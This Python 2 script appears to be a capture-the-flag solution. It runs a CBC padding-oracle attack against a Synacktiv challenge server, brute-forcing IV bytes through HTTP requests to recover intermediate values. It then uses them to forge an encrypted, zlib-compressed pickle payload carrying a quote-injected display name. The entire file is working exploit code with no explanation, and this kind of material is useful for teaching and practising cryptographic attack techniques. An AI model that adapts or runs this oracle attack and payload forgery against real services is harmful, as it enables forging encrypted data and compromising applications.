import zlib
from itertools import izip, cycle
from base64 import b64decode, b64encode
import pickle
import requests

BLOCK_SIZE=16
def xor(data, key):
    '''
    XOR two bytearray objects with each other.
    '''
    return bytearray([x ^ y for x, y in izip(data, cycle(key))])

def bust(block,search_range):
    s = requests.Session()

    IV = bytearray(BLOCK_SIZE)
    INTER = bytearray(BLOCK_SIZE)
     
    x = 2
    TRUE_VALUE = bytearray(BLOCK_SIZE)
    for i in reversed(xrange(1,BLOCK_SIZE)):
            OK=False
            print "bf : %d" % i
            for char in search_range:
                    IV[i] = char
                    data = {"vs": b64encode(str(IV+block))}
                    r = s.post("http://nsc2014.synacktiv.com:65480/msg.list", data=data)
                    if "Error" in r.reason:
                            OK=True
                            print "FOUND : 0x%X" % char
                            TRUE_VALUE[i] = char
                            break
            x += 1
            for j in range(BLOCK_SIZE):
                    if 15 - j <= x - 3:
                            INTER[j] = TRUE_VALUE[j]^(17-j)
                            IV[j] = x ^ INTER[j]
            if OK == False:
                print "Bad search_range -> reverse"
                return bust(block,list(reversed(search_range)))
    IV[1]=INTER[1]^0x9C
    IV[2]=INTER[2]^0x0F
    for k in reversed(range(3,16)):
            IV[k] = (0xE) ^ INTER[k]
    print "bf : 0"
    for i in range(0x100):
            IV[0]=i
            data = {"vs": b64encode(str(IV+block))}
            r = s.post("http://nsc2014.synacktiv.com:65480/msg.list", data=data)
            if "incomplete" in r.reason:
                    print "FOUND : 0x%X" % char
                    TRUE_VALUE[0] = i
                    INTER[0] = i ^ 0x78
                    break
    return INTER


if __name__ == '__main__':
    data = {"msg": [], "display_name":"a'"}
    newdata=pickle.dumps(data)
    print newdata

    plaintext=zlib.compress(newdata,9)
    pad = BLOCK_SIZE - (len(plaintext) % BLOCK_SIZE)
    plaintext = bytearray(plaintext + chr(pad) * pad)
    print "PLAINTEXT : "+str(plaintext).encode("hex")

    IV=bytearray(BLOCK_SIZE)
    block = IV
    encrypted = IV
    n = len(plaintext + IV)
    block_num=0
    while n > 16:
        block_num = (n/16)-1
        print "Running on bloc "+str(block_num)+" n="+str(n)
        intermediate_bytes = bust(block,range(0x100))
        print str(intermediate_bytes).encode("hex")
        print "-----"
        block = xor(intermediate_bytes,plaintext[n - BLOCK_SIZE * 2:n + BLOCK_SIZE])
        print str(block).encode("hex")
        print "-----"
        encrypted = block + encrypted
        n -= BLOCK_SIZE
    print "------ ICI -----"
    print str(encrypted).encode("hex")
